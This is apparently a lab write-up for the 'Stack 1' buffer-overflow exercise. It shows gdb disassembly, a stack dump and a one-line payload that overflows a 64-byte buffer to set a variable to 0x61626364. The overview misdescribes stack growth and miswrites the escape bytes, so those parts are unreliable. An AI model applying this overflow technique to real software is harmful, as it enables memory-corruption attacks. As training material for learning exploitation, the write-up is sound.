# Stack 1
## Overview
    The esp(current stack pointer) grows upward when allocating memory 
    and the higher the esp goes, it points to smaller address number.
    Thus, you need to overwrite all the space of buffer(64 bytes) 
    and then overwrite the allocated space for int modified to 0x61626364.

## Process
    $ gdb -q ./stack1
    (gdb) disas main
        Dump of assembler code for function main:
            0x08048464 <+0>:     push   %ebp
            0x08048465 <+1>:     mov    %esp,%ebp
            0x08048467 <+3>:     and    $0xfffffff0,%esp
            0x0804846a <+6>:     sub    $0x60,%esp
            0x0804846d <+9>:     cmpl   $0x1,0x8(%ebp)
            0x08048471 <+13>:    jne    0x8048487 <main+35>
            0x08048473 <+15>:    movl   $0x80485a0,0x4(%esp)
            0x0804847b <+23>:    movl   $0x1,(%esp)
            0x08048482 <+30>:    call   0x8048388 <errx@plt>
            0x08048487 <+35>:    movl   $0x0,0x5c(%esp)
            0x0804848f <+43>:    mov    0xc(%ebp),%eax
            0x08048492 <+46>:    add    $0x4,%eax
            0x08048495 <+49>:    mov    (%eax),%eax
            0x08048497 <+51>:    mov    %eax,0x4(%esp)
            0x0804849b <+55>:    lea    0x1c(%esp),%eax
            0x0804849f <+59>:    mov    %eax,(%esp)
            0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>
            0x080484a7 <+67>:    mov    0x5c(%esp),%eax
            0x080484ab <+71>:    cmp    $0x61626364,%eax
            0x080484b0 <+76>:    jne    0x80484c0 <main+92>
            0x080484b2 <+78>:    movl   $0x80485bc,(%esp)
            0x080484b9 <+85>:    call   0x8048398 <puts@plt>
            0x080484be <+90>:    jmp    0x80484d5 <main+113>
            0x080484c0 <+92>:    mov    0x5c(%esp),%edx
            0x080484c4 <+96>:    mov    $0x80485f3,%eax
            0x080484c9 <+101>:   mov    %edx,0x4(%esp)
            0x080484cd <+105>:   mov    %eax,(%esp)
            0x080484d0 <+108>:   call   0x8048378 <printf@plt>
            0x080484d5 <+113>:   leave
            0x080484d6 <+114>:   ret
        End of assembler dump.
    (gdb) b *main+71
        Breakpoint 1 at 0x80484ab: file stack1/stack1.c, line 18.
    (gdb) x/60x $esp
        0xffffd500: 0xffffd51c  0xffffd767  0xf7fb8000  0x0000cd57
        0xffffd510: 0xffffffff  0x0000002f  0xf7e12dc8  0x41414141
        0xffffd520: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd530: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd540: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd550: 0x00414141  0x080481e0  0x080484fb  0x00000000
        0xffffd560: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
        0xffffd570: 0x00000002  0xffffd604  0xffffd610  0x00000000
        0xffffd580: 0x00000000  0x00000000  0xf7fb8000  0xf7ffdc04
        0xffffd590: 0xf7ffd000  0x00000000  0xf7fb8000  0xf7fb8000
        0xffffd5a0: 0x00000000  0xe783169f  0xdbe2188f  0x00000000
        0xffffd5b0: 0x00000000  0x00000000  0x00000002  0x080483b0
        0xffffd5c0: 0x00000000  0xf7fedf10  0xf7fe8780  0xf7ffd000
        0xffffd5d0: 0x00000002  0x080483b0  0x00000000  0x080483d1
        0xffffd5e0: 0x08048464  0x00000002  0xffffd604  0x080484f0
    
    buffer[64]: from last stack of line 0xffffd510 
            to 3rd stack of line 0xffffd550 
            -> 64 bytes needs to be overwritten
    modified: from last stack of line 0xffffd550



## Method
    Use 64 bytes to overwrite buffer[64] and little endian of 0x61626364
    (/x64/x63/x62/x61) to overwrite modified.

## Answer
    ./stack1 $(python -c "print 'A'*64+'\x64\x63\x62\x61'")
    you have correctly got the variable to the right value
